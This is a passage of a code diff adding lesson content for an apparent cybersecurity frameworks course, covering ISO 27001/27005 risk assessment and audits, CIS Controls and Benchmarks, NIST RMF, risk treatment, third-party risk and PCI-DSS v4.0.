+| Likelihood | Impact | Risk Level |
+|-----------|--------|------------|
+| High | High | Critical |
+| High | Medium | High |
+| Medium | Medium | Medium |
+| Low | Medium | Low |
+| Low | Low | Very Low |
+
+### Quantitative Analysis (FAIR Methodology)
+Uses numerical values:
+- **ALE** (Annualized Loss Expectancy) = SLE × ARO
+- **SLE** (Single Loss Expectancy) = Asset Value × Exposure Factor
+- **ARO** (Annualized Rate of Occurrence)
+
+**Example:**
+- Asset: Customer database (value: $2M)
+- Threat: SQL injection breach
+- Exposure Factor: 30%
+- SLE = $2M × 0.30 = $600,000
+- ARO = 0.1 (once every 10 years)
+- ALE = $600,000 × 0.1 = $60,000/year
+
+## Step 4: Risk Evaluation
+
+Compare analyzed risks against acceptance criteria:
+- Risks above appetite → Must be treated
+- Risks within appetite → May be accepted with documentation
+- Create a prioritized risk register
+
+## Step 5: Risk Treatment
+
+| Strategy | Description | Example |
+|----------|------------|---------|
+| Mitigate | Reduce likelihood or impact | Deploy WAF to reduce SQL injection risk |
+| Transfer | Shift risk to a third party | Purchase cyber insurance |
+| Avoid | Eliminate the risk source | Discontinue the vulnerable service |
+| Accept | Acknowledge and document | Low-impact risk within appetite |
+    `,
+    keyTakeaways: [
+      "ISO 27005 provides a structured process for cybersecurity risk assessment",
+      "Risk identification covers assets, threats, vulnerabilities, and existing controls",
+      "Qualitative analysis uses descriptive scales; quantitative uses financial models like FAIR",
+      "ALE = SLE × ARO is the core formula for quantitative risk analysis",
+      "Risk treatment options are mitigate, transfer, avoid, or accept"
+    ],
+  },
+  {
+    id: "cf-3.4",
+    courseId: "cybersecurity-frameworks",
+    title: "Statement of Applicability & Audit Readiness",
+    content: `
+# Statement of Applicability & Audit Readiness
+
+The Statement of Applicability (SoA) is the most critical document in ISO 27001 — it defines which Annex A controls your organization has selected and why.
+
+## The Statement of Applicability (SoA)
+
+The SoA is a comprehensive table listing all 93 Annex A controls with:
+- Whether each control is **applicable** or **not applicable**
+- **Justification** for inclusion or exclusion
+- **Implementation status** (Implemented / In Progress / Planned)
+- **Control description** — How the control is implemented in your context
+
+### SoA Template
+
+| Control | Title | Applicable? | Justification | Status | Implementation |
+|---------|-------|-------------|---------------|--------|---------------|
+| A.5.1 | Info security policies | Yes | Required for ISMS governance | Implemented | Policy approved by CISO, reviewed annually |
+| A.7.2 | Physical entry | Yes | Office contains sensitive data | Implemented | Badge access, visitor logs, CCTV |
+| A.8.12 | Data leakage prevention | Yes | Process customer PII and financial data | In Progress | DLP tool selected, deployment Q2 |
+| A.7.3 | Securing offices/rooms | No | Fully remote workforce, no physical offices | N/A | — |
+
+### SoA Best Practices
+- Don't exclude controls without strong justification
+- "We don't do that" is not a valid exclusion reason
+- Link each control to the risk(s) it addresses
+- Update the SoA whenever controls change
+
+## Preparing for the Audit
+
+### Documentation Checklist
+
+**Mandatory Documents:**
+- [ ] ISMS scope statement
+- [ ] Information security policy
+- [ ] Risk assessment methodology
+- [ ] Risk assessment results
+- [ ] Risk treatment plan
+- [ ] Statement of Applicability
+- [ ] Information security objectives
+- [ ] Evidence of competence (training records)
+- [ ] Operational planning and control evidence
+- [ ] Internal audit results
+- [ ] Management review minutes
+- [ ] Corrective action records
+
+### Internal Audits
+
+ISO 27001 requires internal audits before the certification audit:
+
+**Audit Program:**
+1. Plan audits covering all ISMS clauses and applicable controls
+2. Use auditors independent of the area being audited
+3. Document findings: conformities, nonconformities, observations
+4. Track corrective actions to closure
+5. Report results to management
+
+### Management Reviews
+
+Management reviews must cover:
+- Status of actions from previous reviews
+- Changes in external/internal issues
+- Feedback on security performance
+- Results of risk assessments
+- Audit results
+- Opportunities for improvement
+
+### Common Audit Findings
+
+| Finding | Type | Prevention |
+|---------|------|-----------|
+| Policies not reviewed annually | Minor NC | Set calendar reminders for review cycles |
+| No evidence of risk assessment updates | Major NC | Document all risk assessment activities |
+| Staff unaware of security policy | Minor NC | Improve awareness program and track completion |
+| Incomplete asset inventory | Major NC | Implement automated discovery tools |
+| No incident response testing | Minor NC | Schedule tabletop exercises quarterly |
+
+**NC = Nonconformity**
+
+## After Certification
+
+Certification is not the finish line — it's the starting point:
+- Conduct surveillance audits annually
+- Continuously improve based on incidents and audit findings
+- Update risk assessments when the environment changes
+- Maintain evidence of ongoing control effectiveness
+    `,
+    keyTakeaways: [
+      "The SoA lists all 93 controls with applicability, justification, and implementation status",
+      "Never exclude a control without documented, defensible justification",
+      "Internal audits must be conducted before the certification audit",
+      "Management reviews are mandatory and must cover specific required topics",
+      "Certification requires ongoing maintenance through surveillance audits and improvement"
+    ],
+  },
+
+  // Remaining modules - shorter content for brevity but still unique
+  {
+    id: "cf-4.1",
+    courseId: "cybersecurity-frameworks",
+    title: "CIS Controls v8 Overview",
+    content: `
+# CIS Critical Security Controls v8
+
+The Center for Internet Security (CIS) Controls are a prioritized set of 18 cybersecurity best practices developed by a global community of IT professionals. They represent the most effective actions organizations can take to stop today's most common attacks.
+
+## The 18 CIS Controls
+
+### Basic Controls (IG1 — Essential Cyber Hygiene)
+| # | Control | Focus |
+|---|---------|-------|
+| 1 | Inventory and Control of Enterprise Assets | Know what's on your network |
+| 2 | Inventory and Control of Software Assets | Know what software is running |
+| 3 | Data Protection | Classify and protect sensitive data |
+| 4 | Secure Configuration of Assets & Software | Harden default configurations |
+| 5 | Account Management | Manage user and admin accounts |
+| 6 | Access Control Management | Enforce least privilege |
+
+### Foundational Controls (IG2)
+| # | Control | Focus |
+|---|---------|-------|
+| 7 | Continuous Vulnerability Management | Find and fix vulnerabilities |
+| 8 | Audit Log Management | Collect and retain logs |
+| 9 | Email and Web Browser Protections | Secure primary attack vectors |
+| 10 | Malware Defenses | Prevent and detect malware |
+| 11 | Data Recovery | Maintain and test backups |
+| 12 | Network Infrastructure Management | Secure network devices |
+
+### Organizational Controls (IG3)
+| # | Control | Focus |
+|---|---------|-------|
+| 13 | Network Monitoring and Defense | Detect intrusions |
+| 14 | Security Awareness and Skills Training | Educate users |
+| 15 | Service Provider Management | Manage third-party risk |
+| 16 | Application Software Security | Secure software development |
+| 17 | Incident Response Management | Plan and practice IR |
+| 18 | Penetration Testing | Validate defenses |
+
+## Implementation Groups (IGs)
+
+CIS Controls use Implementation Groups to prioritize based on organizational resources and risk:
+
+### IG1: Essential Cyber Hygiene (56 safeguards)
+- Every organization should implement these
+- Small organizations with limited IT resources
+- Addresses the most common attack patterns
+- **Achieves ~80% risk reduction**
+
+### IG2: Intermediate (74 additional safeguards)
+- Organizations with dedicated IT staff
+- Managing enterprise-level complexity
+- Sensitive client data or regulatory requirements
+
+### IG3: Advanced (23 additional safeguards)
+- Organizations with security experts
+- Critical infrastructure or high-value targets
+- Sophisticated threat defense
+
+## CIS Controls vs. NIST CSF Mapping
+
+| CIS Control | NIST CSF Function |
+|-------------|-------------------|
+| 1-2 (Inventory) | Identify |
+| 3-6 (Protect) | Protect |
+| 7-12 (Foundational) | Protect / Detect |
+| 13 (Network Defense) | Detect |
+| 14 (Training) | Protect |
+| 17 (Incident Response) | Respond |
+| 18 (Pen Testing) | Identify |
+    `,
+    keyTakeaways: [
+      "CIS Controls provide 18 prioritized cybersecurity actions organized by implementation groups",
+      "IG1 (Essential Cyber Hygiene) with 56 safeguards achieves approximately 80% risk reduction",
+      "Controls are developed by a global community and updated regularly based on real attack data",
+      "CIS Controls map directly to NIST CSF functions for integrated framework adoption",
+      "Start with IG1 regardless of organization size — it covers the most critical defenses"
+    ],
+  },
+  {
+    id: "cf-4.2",
+    courseId: "cybersecurity-frameworks",
+    title: "Implementation Group 1: Essential Cyber Hygiene",
+    content: `
+# Implementation Group 1: Essential Cyber Hygiene
+
+IG1 is the on-ramp to the CIS Controls — 56 safeguards that every organization, regardless of size, should implement. These address the most common and impactful cyber attacks.
+
+## Why Start with IG1?
+
+According to the CIS Community Defense Model, IG1 safeguards protect against **77% of MITRE ATT&CK (sub-)techniques** used in common attacks. This makes IG1 the single most cost-effective security investment.
+
+## Key IG1 Safeguards by Control
+
+### Control 1: Enterprise Asset Inventory
+- **1.1** Establish and maintain a detailed enterprise asset inventory
+- **1.2** Address unauthorized assets (quarantine or remove)
+- Use: Network scanning, DHCP logs, NAC, endpoint agents
+
+### Control 2: Software Asset Inventory
+- **2.1** Establish and maintain a software inventory
+- **2.2** Ensure authorized software is currently supported
+- **2.3** Address unauthorized software
+- Use: Application whitelisting, software inventory tools
+
+### Control 3: Data Protection
+- **3.1** Establish and maintain a data management process
+- **3.4** Enforce data retention policies
+- **3.6** Encrypt data on end-user devices (full disk encryption)
+- Use: BitLocker, FileVault, data classification tools
+
+### Control 4: Secure Configuration
+- **4.1** Establish and maintain a secure configuration process
+- **4.7** Manage default accounts (disable or rename)
+- Use: CIS Benchmarks, group policy, configuration management
+
+### Control 5: Account Management
+- **5.1** Establish and maintain an account inventory
+- **5.2** Use unique passwords (no shared accounts)
+- **5.3** Disable dormant accounts (after 45 days of inactivity)
+- **5.4** Restrict admin privileges to dedicated admin accounts
+
+### Control 6: Access Control
+- **6.1** Establish an access granting process
+- **6.2** Establish an access revoking process
+- **6.5** Require MFA for externally-exposed applications
+- **6.8** Define and enforce access based on role (RBAC)
+
+## Quick Implementation Checklist
+
+\`\`\`
+□ Can you list every device on your network?
+□ Do you know what software is installed on each system?
+□ Are default passwords changed on all systems?
+□ Is full disk encryption enabled on all laptops?
+□ Are admin accounts separate from daily-use accounts?
+□ Is MFA enabled for email, VPN, and cloud services?
+□ Are inactive accounts disabled within 45 days?
+□ Do you have a process for granting and revoking access?
+\`\`\`
+
+If you answered "no" to any of these, those are your IG1 priorities.
+
+## Free Tools for IG1
+
+- **CIS-CAT Lite** — Free benchmarking tool
+- **NMAP** — Network discovery and inventory
+- **Nessus Essentials** — Vulnerability scanning (free for 16 IPs)
+- **LAPS** — Local admin password management (Microsoft)
+- **Snipe-IT** — Open-source IT asset management
+    `,
+    keyTakeaways: [
+      "IG1's 56 safeguards protect against 77% of common ATT&CK techniques",
+      "Key focuses: asset inventory, secure configuration, account management, MFA, and encryption",
+      "IG1 is the most cost-effective security investment for any organization",
+      "Free tools like CIS-CAT, NMAP, and Nessus Essentials enable IG1 implementation",
+      "Start with the quick checklist to identify your most critical IG1 gaps"
+    ],
+  },
+  {
+    id: "cf-4.3",
+    courseId: "cybersecurity-frameworks",
+    title: "Implementation Groups 2 & 3: Advanced Controls",
+    content: `
+# Implementation Groups 2 & 3: Advanced Controls
+
+After mastering IG1, organizations with more resources and higher risk profiles progress to IG2 and IG3 safeguards for deeper defense.
+
+## Implementation Group 2 (74 additional safeguards)
+
+IG2 is for organizations that manage sensitive data, have dedicated IT teams, and face more sophisticated threats.
+
+### Key IG2 Additions by Control
+
+**Control 7: Vulnerability Management**
+- Automated vulnerability scanning (at least weekly)
+- Remediate detected vulnerabilities based on risk
+- Manage internal vulnerability scanning processes
+
+**Control 8: Audit Log Management**
+- Collect audit logs across all enterprise assets
+- Standardize time synchronization (NTP)
+- Retain audit logs for at least 90 days
+- Review logs for anomalies (weekly minimum)
+
+**Control 9: Email & Browser Protections**
+- Use DNS filtering to block known malicious domains
+- Restrict unnecessary browser and email plugins
+- Deploy email authentication (SPF, DKIM, DMARC)
+
+**Control 10: Malware Defenses**
+- Deploy anti-malware on all enterprise assets
+- Enable auto-update for anti-malware signatures
+- Disable autorun for removable media
+
+**Control 11: Data Recovery**
+- Perform automated backups (at least weekly)
+- Test data recovery from backups quarterly
+- Protect backups with encryption and separate credentials
+- Maintain offline backup copies (3-2-1 rule)
+
+**Control 12: Network Infrastructure**
+- Manage network devices using secure protocols (SSH, HTTPS)
+- Ensure all network devices have current firmware
+- Centralize network authentication (RADIUS/TACACS+)
+
+## Implementation Group 3 (23 additional safeguards)
+
+IG3 is for mature organizations protecting critical infrastructure or high-value targets.
+
+### Key IG3 Additions
+
+**Control 13: Network Monitoring**
+- Deploy IDS/IPS at network boundaries
+- Perform traffic analysis for anomaly detection
+- Deploy SIEM with correlation rules
+
+**Control 16: Application Security**
+- Perform static and dynamic code analysis (SAST/DAST)
+- Conduct security testing for in-house applications
+- Maintain a software bill of materials (SBOM)
+
+**Control 18: Penetration Testing**
+- Conduct external and internal penetration testing annually
+- Perform red team exercises
+- Include social engineering in security testing
+
+## IG Progression Strategy
+
+\`\`\`
+Year 1: Implement all IG1 safeguards
+         ↓
+Year 2: Add IG2 safeguards (focus on logging, vuln mgmt, email)
+         ↓
+Year 3: Add IG3 safeguards (pen testing, app security, advanced monitoring)
+         ↓
+Ongoing: Continuous improvement and reassessment
+\`\`\`
+    `,
+    keyTakeaways: [
+      "IG2 adds 74 safeguards focusing on logging, vulnerability management, and email security",
+      "IG3 adds 23 advanced safeguards including pen testing, SIEM, and application security",
+      "A typical progression takes 3+ years from IG1 through IG3",
+      "IG2 priorities: automated scanning, centralized logging, backup testing, email authentication",
+      "IG3 is for organizations with dedicated security teams defending against sophisticated threats"
+    ],
+  },
+  {
+    id: "cf-4.4",
+    courseId: "cybersecurity-frameworks",
+    title: "CIS Benchmarks & Hardening Guides",
+    content: `
+# CIS Benchmarks & Hardening Guides
+
+CIS Benchmarks are detailed configuration guidelines developed through a consensus process to harden operating systems, applications, cloud platforms, and network devices.
+
+## What Are CIS Benchmarks?
+
+CIS Benchmarks are prescriptive, step-by-step hardening guides that specify exact configuration settings to secure a system. They are developed by subject matter experts and updated regularly.
+
+## Available Benchmarks
+
+### Operating Systems
+- Windows 10/11 Enterprise
+- Windows Server 2019/2022
+- Ubuntu Linux 20.04/22.04
+- Red Hat Enterprise Linux 8/9
+- macOS Ventura/Sonoma
+- CentOS, Debian, Amazon Linux
+
+### Cloud Platforms
+- AWS Foundations Benchmark
+- Azure Foundations Benchmark
+- Google Cloud Platform (GCP)
+- Oracle Cloud Infrastructure
+- Alibaba Cloud
+
+### Applications & Databases
+- Microsoft 365
+- Google Workspace
+- Docker / Kubernetes
+- PostgreSQL, MySQL, Oracle
+- Apache, Nginx, IIS
+
+### Network Devices
+- Cisco IOS/NX-OS
+- Palo Alto PAN-OS
+- Juniper Junos
+- Fortinet FortiOS
+
+## Benchmark Profiles
+
+Each benchmark has two profiles:
+
+### Level 1 (L1) — Practical Security
+- Minimal performance impact
+- Broadly applicable
+- Should be implemented on all systems
+- **Example:** Ensure Windows Firewall is enabled for all profiles
+
+### Level 2 (L2) — Defense in Depth
+- May impact functionality or performance
+- For high-security environments
+- **Example:** Disable all local administrator accounts except the built-in
+
+## Using CIS-CAT for Assessment
+
+CIS-CAT (Configuration Assessment Tool) automates benchmark compliance checking:
+
+\`\`\`
+CIS-CAT Assessment Report
+═══════════════════════════
+Benchmark: CIS Microsoft Windows 11 Enterprise v2.0.0
+Profile:   Level 1
+Date:      2024-12-15
+
+Overall Score: 78% (156/200 checks passed)
+
+Failed Checks (High Priority):
+✗ 1.1.1  Ensure 'Enforce password history' is set to '24 or more'
+✗ 2.3.1  Ensure 'Accounts: Block Microsoft accounts' is set to enabled
+✗ 18.9.5 Ensure 'Turn on PowerShell Script Block Logging' is enabled
+\`\`\`
+
+## Hardening Process
+
+1. **Baseline** — Run CIS-CAT assessment on a standard build
+2. **Analyze** — Review failed checks and assess impact
+3. **Test** — Apply settings in a test environment
+4. **Validate** — Confirm no application breakage
+5. **Deploy** — Push via Group Policy, Ansible, or SCCM
+6. **Monitor** — Continuously check for configuration drift
+
+## Integration with Frameworks
+
+CIS Benchmarks directly support:
+- **NIST CSF PR.PS** (Platform Security)
+- **ISO 27001 A.8.9** (Configuration Management)
+- **CIS Control 4** (Secure Configuration)
+- **PCI-DSS Requirement 2** (Do not use vendor-supplied defaults)
+    `,
+    keyTakeaways: [
+      "CIS Benchmarks provide prescriptive hardening guides for 100+ technologies",
+      "Level 1 profiles are practical for all systems; Level 2 is for high-security environments",
+      "CIS-CAT automates compliance checking against benchmark settings",
+      "Hardening should follow: baseline → analyze → test → validate → deploy → monitor",
+      "Benchmarks directly support NIST CSF, ISO 27001, CIS Controls, and PCI-DSS requirements"
+    ],
+  },
+
+  // Modules 5-10: Concise unique content
+  {
+    id: "cf-5.1", courseId: "cybersecurity-frameworks", title: "NIST Risk Management Framework (RMF)",
+    content: `
+# NIST Risk Management Framework (RMF)
+
+The NIST RMF (SP 800-37) provides a structured 7-step process for integrating security, privacy, and supply chain risk management into the system development lifecycle. Originally designed for US federal agencies, it is now widely adopted by defense contractors, critical infrastructure, and large enterprises.
+
+## The 7 RMF Steps
+
+### Step 1: Prepare
+- Establish context and priorities
+- Identify key stakeholders
+- Conduct organization-level risk assessment
+- Develop or update the risk management strategy
+
+### Step 2: Categorize
+- Categorize the information system based on FIPS 199
+- Determine impact levels (Low, Moderate, High) for:
+  - **Confidentiality** — Unauthorized disclosure
+  - **Integrity** — Unauthorized modification
+  - **Availability** — Disruption of access
+
+### Step 3: Select
+- Choose security controls from NIST SP 800-53
+- Tailor controls based on risk assessment
+- Document in the System Security Plan (SSP)
+
+### Step 4: Implement
+- Deploy selected controls in the information system
+- Document how controls are implemented
+- Update the SSP with implementation details
+
+### Step 5: Assess
+- Evaluate whether controls are properly implemented
+- Determine if controls produce desired outcomes
+- Document findings in the Security Assessment Report (SAR)
+
+### Step 6: Authorize
+- Senior official reviews the risk package
+- Makes a risk-based decision: Authorize, Deny, or Authorize with Conditions
+- Issues the Authorization to Operate (ATO)
+
+### Step 7: Monitor
+- Continuously monitor control effectiveness
+- Track changes to the system and environment
+- Update the risk package as needed
+- Report security posture to stakeholders
+
+## NIST SP 800-53 Control Families
+
+SP 800-53 Rev. 5 contains over 1,000 controls across 20 families:
+
+| Family | Code | Example Control |
+|--------|------|----------------|
+| Access Control | AC | AC-2: Account Management |
+| Audit & Accountability | AU | AU-6: Audit Review |
+| Security Assessment | CA | CA-7: Continuous Monitoring |
+| Configuration Management | CM | CM-6: Configuration Settings |
+| Incident Response | IR | IR-4: Incident Handling |
+| Risk Assessment | RA | RA-5: Vulnerability Monitoring |
+| System & Information Integrity | SI | SI-4: System Monitoring |
+
+## RMF vs. Other Frameworks
+
+| Feature | NIST RMF | NIST CSF | ISO 27001 |
+|---------|----------|----------|-----------|
+| Mandatory for | US federal agencies | Voluntary | Voluntary (certifiable) |
+| Focus | System-level authorization | Organizational risk | Management system |
+| Controls | SP 800-53 (1000+) | References other standards | Annex A (93) |
+| Output | ATO decision | Risk profile | Certification |
+    `,
+    keyTakeaways: [
+      "NIST RMF follows 7 steps: Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor",
+      "Systems are categorized as Low, Moderate, or High impact using FIPS 199",
+      "Controls are selected from NIST SP 800-53 with over 1,000 controls across 20 families",
+      "The process culminates in an Authorization to Operate (ATO) decision",
+      "RMF is mandatory for US federal systems but widely adopted in defense and critical infrastructure"
+    ],
+  },
+  { id: "cf-5.2", courseId: "cybersecurity-frameworks", title: "Risk Assessment Techniques",
+    content: `
+# Risk Assessment Techniques
+
+Risk assessment is the systematic process of identifying, analyzing, and evaluating risks. This lesson explores the major methodologies used in cybersecurity risk assessment.
+
+## Qualitative vs. Quantitative
+
+### Qualitative Risk Assessment
+Uses subjective ratings (High/Medium/Low) based on expert judgment.
+
+**Risk Matrix (5x5):**
+\`\`\`
+Impact →    Negligible  Minor  Moderate  Major  Catastrophic
+Likelihood ↓
+Almost Certain   M        H       H        C        C
+Likely           M        M       H        H        C
+Possible         L        M       M        H        H
+Unlikely         L        L       M        M        H
+Rare             L        L       L        M        M
+\`\`\`
+
+**Pros:** Fast, easy to understand, works with limited data
+**Cons:** Subjective, inconsistent between assessors, hard to justify spending
+
+### Quantitative Risk Assessment (FAIR)
+Factor Analysis of Information Risk (FAIR) provides a quantitative model.
+
+**FAIR Taxonomy:**
+\`\`\`
+Risk = Loss Event Frequency × Loss Magnitude
+
+Loss Event Frequency = Threat Event Frequency × Vulnerability
+Loss Magnitude = Primary Loss + Secondary Loss
+\`\`\`
+
+**Example Calculation:**
+- Threat: Ransomware attack on file servers
+- Threat Event Frequency: 2 per year (based on industry data)
+- Vulnerability: 0.3 (30% chance of successful attack)
+- Loss Event Frequency: 2 × 0.3 = 0.6 per year
+- Primary Loss (downtime, recovery): $500,000
+- Secondary Loss (reputation, legal): $200,000
+- Total Loss Magnitude: $700,000
+- Annual Risk: 0.6 × $700,000 = $420,000/year
+
+**Pros:** Defensible, enables ROI calculations, comparable
+**Cons:** Requires data, complex, time-consuming
+
+## Threat Modeling Methodologies
+
+### STRIDE (Microsoft)
+Categorizes threats by type:
+- **S**poofing — Pretending to be someone else
+- **T**ampering — Modifying data or code
+- **R**epudiation — Denying actions taken
+- **I**nformation Disclosure — Exposing sensitive data
+- **D**enial of Service — Making services unavailable
+- **E**levation of Privilege — Gaining unauthorized access
+
+### DREAD (Scoring)
+Rates threats on a 1-10 scale:
+- **D**amage potential
+- **R**eproducibility
+- **E**xploitability
+- **A**ffected users
+- **D**iscoverability
+
+### PASTA (Process for Attack Simulation and Threat Analysis)
+A 7-stage risk-centric threat modeling methodology that aligns business objectives with technical requirements.
+
+## Choosing the Right Approach
+
+| Scenario | Recommended Method |
+|----------|-------------------|
+| Initial/quick assessment | Qualitative (risk matrix) |
+| Board presentation for budget | Quantitative (FAIR) |
+| Application security review | STRIDE threat modeling |
+| Comprehensive program | Hybrid (qualitative + quantitative for top risks) |
+    `,
+    keyTakeaways: [
+      "Qualitative assessments use subjective ratings; quantitative use financial models",
+      "FAIR methodology calculates risk as Loss Event Frequency × Loss Magnitude",
+      "STRIDE categorizes threats: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation",
+      "Most mature organizations use a hybrid approach — qualitative screening with quantitative deep dives",
+      "Quantitative analysis is essential for justifying security budgets to executives"
+    ],
+  },
+  { id: "cf-5.3", courseId: "cybersecurity-frameworks", title: "Risk Treatment & Acceptance",
+    content: `
+# Risk Treatment & Acceptance
+
+After identifying and analyzing risks, organizations must decide how to address each one. Risk treatment is the process of selecting and implementing measures to modify risk.
+
+## The Four Treatment Strategies
+
+### 1. Risk Mitigation (Reduce)
+Implement controls to reduce the likelihood or impact of a risk.
+
+**Examples:**
+- Deploy MFA to reduce credential theft risk
+- Implement network segmentation to limit blast radius
+- Conduct security awareness training to reduce phishing success rate
+
+**When to use:** When the cost of mitigation is less than the expected loss
+
+### 2. Risk Transfer (Share)
+Shift the financial burden of risk to a third party.
+
+**Examples:**
+- Purchase cyber insurance
+- Outsource security operations to an MSSP
+- Use cloud services with shared responsibility model
+
+**When to use:** When the organization cannot fully mitigate the risk, or when transfer is more cost-effective
+
+### 3. Risk Avoidance (Eliminate)
+Remove the source of risk entirely.
+
+**Examples:**
+- Decommission a legacy system with known vulnerabilities
+- Stop collecting unnecessary personal data
+- Exit a market with unacceptable regulatory risk
+
+**When to use:** When the risk outweighs the business benefit
+
+### 4. Risk Acceptance (Retain)
+Acknowledge the risk and choose not to take additional action.
+
+**Requirements for acceptance:**
+- Risk must be within the organization's risk appetite
+- Must be formally documented and approved by a risk owner
+- Must be reviewed periodically (at least annually)
+- Must include a trigger for reassessment
+
+**Risk Acceptance Form:**
+\`\`\`
+Risk ID:           R-2024-042
+Risk Description:  Unpatched legacy application (end-of-life)
+Risk Level:        Medium
+Justification:     System scheduled for decommission in Q3 2025.
+                   Compensating controls: network isolation, enhanced monitoring.
+Risk Owner:        VP Engineering
+Approval Date:     2024-12-01
+Review Date:       2025-06-01
+\`\`\`
+
+## Risk Treatment Plan
+
+A Risk Treatment Plan documents all decisions:
+
+| Risk ID | Risk | Treatment | Control | Owner | Timeline | Status |
+|---------|------|-----------|---------|-------|----------|--------|
+| R-001 | Phishing | Mitigate | Email gateway + training | CISO | Q1 | In Progress |
+| R-002 | Ransomware | Mitigate + Transfer | EDR + Cyber insurance | IT Director | Q2 | Planned |
+| R-003 | Legacy app vuln | Accept | Network isolation | VP Eng | Q3 | Accepted |
+| R-004 | Insider data theft | Mitigate | DLP + access reviews | CISO | Q2 | In Progress |
+
+## Residual Risk
+
+After treatment, the remaining risk is called **residual risk**. If residual risk exceeds the risk appetite, additional treatment is needed.
+
+\`\`\`
+Inherent Risk  →  Treatment  →  Residual Risk
+(before controls)              (after controls)
+
+Must be within risk appetite
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Four treatment strategies: mitigate, transfer, avoid, and accept",
+      "Risk acceptance requires formal documentation, risk owner approval, and periodic review",
+      "Risk treatment plans document all decisions with owners, timelines, and status",
+      "Residual risk is what remains after treatment — it must fall within risk appetite",
+      "Cyber insurance is risk transfer, not risk elimination — controls are still needed"
+    ],
+  },
+  { id: "cf-5.4", courseId: "cybersecurity-frameworks", title: "Third-Party Risk Management",
+    content: `
+# Third-Party Risk Management
+
+Organizations increasingly rely on vendors, cloud providers, and partners — each introducing risk to the supply chain. Third-party risk management (TPRM) ensures these external relationships don't become security blind spots.
+
+## Why TPRM Matters
+
+- **60% of data breaches** involve a third party (Ponemon)
+- Supply chain attacks (SolarWinds, Kaseya, MOVEit) demonstrate cascading risk
+- Regulations (GDPR, PCI-DSS, DORA) require vendor security oversight
+- Cloud adoption means critical data resides outside organizational boundaries
+
+## The TPRM Lifecycle
+
+\`\`\`
+┌─────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
+│ Identify │→│ Assess    │→│ Contract  │→│ Monitor   │→│ Offboard  │
+│ & Classify│ │ Risk      │  │ & Onboard │  │ & Review  │  │ & Retain  │
+└─────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
+\`\`\`
+
+### Step 1: Identify & Classify Vendors
+- Maintain a vendor inventory
+- Classify by risk tier based on data access and criticality
+
+| Tier | Criteria | Assessment Level |
+|------|----------|-----------------|
+| Critical | Accesses sensitive data, business-critical service | Full assessment + on-site audit |
+| High | Accesses internal systems or moderate data | Detailed questionnaire + evidence review |
+| Medium | Limited data access, replaceable service | Standard questionnaire |
+| Low | No data access, minimal integration | Self-attestation |
+
+### Step 2: Assess Risk
+- **Security questionnaires** — SIG (Standardized Information Gathering), CAIQ
+- **Certifications** — ISO 27001, SOC 2 Type II, PCI-DSS
+- **External scanning** — SecurityScorecard, BitSight, RiskRecon
+- **Penetration test reports** — Recent third-party pen test results
+
+### Step 3: Contract & Onboard
+Include security requirements in contracts:
+- Data protection obligations
+- Incident notification requirements (e.g., within 24-72 hours)
+- Right to audit clause
+- Subprocessor controls
+- Data return/deletion on termination
+- Breach liability and indemnification
+
+### Step 4: Monitor & Review
+- Continuous monitoring via security rating platforms
+- Annual reassessment for critical vendors
+- Review SOC 2 reports annually
+- Track vendor security incidents
+
+### Step 5: Offboard
+- Ensure data return or secure deletion
+- Revoke all access credentials
+- Confirm contractual obligations are met
+- Update vendor inventory
+
+## Vendor Risk Assessment Red Flags
+
+- No SOC 2 or ISO 27001 certification
+- Unwilling to complete security questionnaires
+- No incident response plan or breach notification process
+- Outdated infrastructure or unpatched systems
+- History of security breaches without demonstrated improvement
+    `,
+    keyTakeaways: [
+      "60% of breaches involve third parties — TPRM is essential for supply chain security",
+      "Vendors should be classified into risk tiers determining assessment depth",
+      "Contracts must include incident notification, right to audit, and data protection clauses",
+      "Continuous monitoring through security rating platforms supplements periodic assessments",
+      "Offboarding must include verified data deletion and complete access revocation"
+    ],
+  },
+
+  // Module 6-10 lessons (abbreviated but unique)
+  { id: "cf-6.1", courseId: "cybersecurity-frameworks", title: "PCI-DSS v4.0 Overview",
+    content: `
+# PCI-DSS v4.0 Overview
+
+The Payment Card Industry Data Security Standard (PCI-DSS) is a set of security standards designed to protect cardholder data wherever it is processed, stored, or transmitted. Version 4.0 was released in March 2022 with a compliance deadline of March 31, 2025.
+
+## The 12 PCI-DSS Requirements
+
+### Build and Maintain a Secure Network and Systems
+1. **Install and maintain network security controls** (firewalls, WAFs, network segmentation)
+2. **Apply secure configurations to all system components** (remove defaults, harden systems)
+
+### Protect Account Data
+3. **Protect stored account data** (encryption, masking, tokenization)
+4. **Protect cardholder data with strong cryptography during transmission** (TLS 1.2+)
+
+### Maintain a Vulnerability Management Program
+5. **Protect all systems against malware** (anti-malware, anti-phishing)
+6. **Develop and maintain secure systems and software** (secure SDLC, patching)
+
+### Implement Strong Access Control Measures
+7. **Restrict access to system components by business need** (least privilege)
+8. **Identify users and authenticate access** (MFA, strong passwords, unique IDs)
+9. **Restrict physical access to cardholder data** (badges, cameras, visitor logs)
+
+### Regularly Monitor and Test Networks
+10. **Log and monitor all access to system components** (audit trails, SIEM)
+11. **Test security of systems and networks regularly** (vulnerability scans, pen tests)
+
+### Maintain an Information Security Policy
+12. **Support information security with organizational policies** (governance, risk, training)
+
+## Key Changes in v4.0
+
+- **Customized approach** — Alternative to the defined approach for meeting requirements
+- **Enhanced authentication** — MFA for all access to the CDE (not just remote)
+- **Targeted risk analysis** — Define frequency of activities based on risk
+- **Roles and responsibilities** — Explicitly defined for every requirement
+- **E-commerce protections** — New requirements for payment page scripts and integrity
+
+## Cardholder Data Environment (CDE)
+
+The CDE includes all people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.
+
+**Key Data Elements:**
+| Data | Storage Allowed? | Must Encrypt? |
+|------|-----------------|---------------|
+| PAN (Primary Account Number) | Yes (encrypted) | Yes |
+| Cardholder Name | Yes | Recommended |
+| Expiration Date | Yes | Recommended |
+| CVV/CVC | Never | N/A |
+| Full Track Data | Never | N/A |
+| PIN/PIN Block | Never | N/A |
+
+## Compliance Levels
+
+| Level | Criteria | Validation |
+|-------|----------|-----------|
+| 1 | >6M transactions/year | Annual on-site QSA audit + quarterly ASV scan |
+| 2 | 1-6M transactions/year | Annual SAQ + quarterly ASV scan |
+| 3 | 20K-1M e-commerce transactions | Annual SAQ + quarterly ASV scan |
+| 4 | <20K e-commerce / <1M other | Annual SAQ (recommended) |
+    `,
+    keyTakeaways: [
